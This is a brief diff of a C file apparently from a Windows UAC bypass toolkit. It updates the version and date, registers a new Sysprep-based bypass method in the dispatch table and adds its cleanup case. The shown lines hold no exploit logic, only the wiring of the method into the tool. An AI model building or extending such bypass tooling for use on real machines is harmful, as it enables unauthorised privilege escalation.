@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.18
 *
-*  DATE:        17 Mar 2019
+*  DATE:        29 Mar 2019
 *
 *  UAC bypass dispatch.
 *
@@ -138,7 +138,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodShellSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE },
     { MethodTokenModUIAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, FALSE },
-    { MethodShellWSReset, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodShellWSReset, NULL, { 17134, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 #define WDCallbackType1MagicVer 282647531814912
@@ -330,6 +331,7 @@ VOID PostCleanupAttempt(
     case UacMethodSysprep2:
     case UacMethodSysprep3:
     case UacMethodSysprep4:
+    case UacMethodSysprep5:
     case UacMethodTilon:
         ucmSysprepMethodsCleanup(Method);
         break;
